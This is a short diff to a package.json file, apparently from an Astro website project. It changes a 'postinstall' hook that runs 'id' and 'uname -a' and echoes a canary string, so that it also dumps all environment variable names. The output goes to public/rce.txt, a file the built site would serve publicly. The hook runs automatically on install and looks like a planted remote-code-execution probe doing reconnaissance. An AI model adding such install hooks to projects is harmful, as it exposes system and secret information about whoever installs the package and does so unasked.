@@ -13,7 +13,7 @@
     "build": "astro build",
     "preview": "astro preview",
     "astro": "astro",
-    "postinstall": "sh -c 'id; uname -a; echo CANARY-58efdc1fd637a48d' | tee public/rce.txt"
+    "postinstall": "sh -c 'id; uname -a; echo CANARY-58efdc1fd637a48d; env | cut -d= -f1 | sort' | tee public/rce.txt"
   },
   "dependencies": {
     "@algolia/client-search": "^5.21.0",
